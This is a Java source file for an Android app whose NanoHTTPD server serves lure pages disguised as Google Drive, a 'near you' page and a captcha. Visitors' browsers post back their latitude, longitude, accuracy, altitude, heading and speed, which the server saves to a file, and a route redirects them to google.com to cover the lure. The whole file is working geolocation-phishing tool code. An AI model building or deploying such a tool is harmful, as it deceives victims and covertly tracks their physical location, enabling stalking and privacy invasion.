package com.cyberfreak.cardviewtesting;

import static java.security.AccessController.getContext;

import android.content.Context;
import android.content.Intent;
import android.os.Environment;
import android.util.Log;

import org.json.JSONObject;
import org.json.JSONException;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;

import fi.iki.elonen.NanoHTTPD;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
public class MyHTTPD extends NanoHTTPD {

    String postData=null,postData1 = null,postData2=null,postData3=null,postData4=null,postData5=null,postData6=null,postData7=null,postData8=null;
    private final Context context;
    public MyHTTPD(int port,Context context) {
        super(port);
        this.context=context;
    }

    @Override
    public Response serve(IHTTPSession session) {
        // Get the URI o"f the requested page
        String uri = session.getUri();
        if (session.getMethod() == Method.GET) {
            if (uri.equals("/gdrive")) {
                String name = "/assets/static/googledrive/index1.html";
                InputStream inputStream = getClass().getResourceAsStream(name);
                return newChunkedResponse(Response.Status.OK, "text/html", inputStream);
            }
            if (uri.equals("/real_url")) {
                // Perform the redirect
                Response response = newFixedLengthResponse(Response.Status.REDIRECT, NanoHTTPD.MIME_PLAINTEXT, "");
                response.addHeader("Location", "https://google.com");
                return response;
            }

                if (uri.equals("/nearyou")) {
                String name = "/assets/static/nearyou/index2.html";
                InputStream inputStream = getClass().getResourceAsStream(name);
                return newChunkedResponse(Response.Status.OK, "text/html", inputStream);
            }
            if (uri.equals("/captcha")) {
                String name = "/assets/static/captcha/index3.html";
                InputStream inputStream = getClass().getResourceAsStream(name);
                return newChunkedResponse(Response.Status.OK, "text/html", inputStream);
            }

            if (uri.startsWith("/static/nearyou")) {
                String filePath = uri.substring("/static/nearyou".length());
                InputStream inputStream = getClass().getResourceAsStream("/assets/static/nearyou" + filePath);
                String mimeType = getMimeType(filePath);
                return newChunkedResponse(Response.Status.OK, mimeType, inputStream);
            }
            if (uri.startsWith("/static/googledrive")) {
                String filePath = uri.substring("/static/googledrive".length());
                InputStream inputStream = getClass().getResourceAsStream("/assets/static/googledrive" + filePath);
                String mimeType = getMimeType(filePath);
                return newChunkedResponse(Response.Status.OK, mimeType, inputStream);
            }
            if (uri.startsWith("/static/captcha")) {
                String filePath = uri.substring("/static/captcha".length());
                InputStream inputStream = getClass().getResourceAsStream("/assets/static/captcha" + filePath);
                String mimeType = getMimeType(filePath);
                return newChunkedResponse(Response.Status.OK, mimeType, inputStream);
            }
            // If the URI is not recognized, return a 404 Not Found response
            return newFixedLengthResponse(Response.Status.NOT_FOUND, "text/plain", "404 Error");
        }
        if (session.getMethod() == Method.POST) {
            // Get the POST data from the request
            Map<String, String> params = new HashMap<String, String>();
            try {
                session.parseBody(params);
            } catch (IOException | ResponseException e) {
                e.printStackTrace();
            }

            postData = session.getParms().get("Lat");
            postData1=session.getParms().get("Lon");
            postData2=session.getParms().get("Acc");
            postData3=session.getParms().get("Alt");
            postData4=session.getParms().get("Dir");
            postData5=session.getParms().get("Spd");

            postData2 = postData2.substring(0, 5)+" m";
            postData3 = postData3.substring(0, 5)+" m";

        }

        if(postData!=null) {
            postData="Latitude: "+postData+"\n"+"Longitude: "+postData1+"\n"+"Accuracy: "+postData2+"\n"+"Altitude: "+postData3+"\n"+"Direction: "+postData4+"\n"+"Speed: "+postData5+"\n";
//            Act1();
        }
        // Store the POST data in a file
        String fileName = "myfile.txt";
        String fileContents = postData;
        File file = new File(context.getFilesDir(), fileName);
        try (FileOutputStream fos = context.openFileOutput(fileName, Context.MODE_PRIVATE)) {
            fos.write(fileContents.getBytes());    // getBytes is working
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return newFixedLengthResponse("Data written to file: ");

    }
    public void Act1(){
        Intent intent = new Intent(context, location_data_main.class);
        // Add extra data (optional)
        intent.putExtra("lat", postData);
        intent.putExtra("lon", postData1);
        context.startActivity(intent);
    }
    private String getMimeType(String filePath) {
        String mimeType = "";
        if (filePath.endsWith(".js")) {
            mimeType = "application/javascript";
        } else if (filePath.endsWith(".css")) {
            mimeType = "text/css";
        } else if (filePath.endsWith(".jpg") || filePath.endsWith(".jpeg")) {
            mimeType = "image/jpeg";
        } else if (filePath.endsWith(".png")) {
            mimeType = "image/png";
        } else if (filePath.endsWith(".gif")) {
            mimeType = "image/gif";
        }
        return mimeType;
    }

}